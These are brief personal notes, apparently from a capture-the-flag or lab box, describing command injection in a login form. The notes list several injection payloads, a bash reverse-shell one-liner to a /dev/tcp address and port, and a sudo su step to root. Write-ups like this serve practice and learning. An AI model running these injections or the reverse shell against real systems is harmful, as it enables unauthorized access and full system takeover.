login is a bit confusing but i will try some basic passwords just to see, nothing... will try command injecting some stuff


in login i tried a bunch of different command injections as follows:
```
test && whoami
test ; whoami
test | whoami
test `whoami`
test $(whoami)
```

test `whoami` returned yelnat

so i ran test ; `bash -c 'bash -i >& /dev/tcp/192.168.45.230/4444 0>&1'`
and got reverse shell where i ran sudo su and was able to get root and flag.
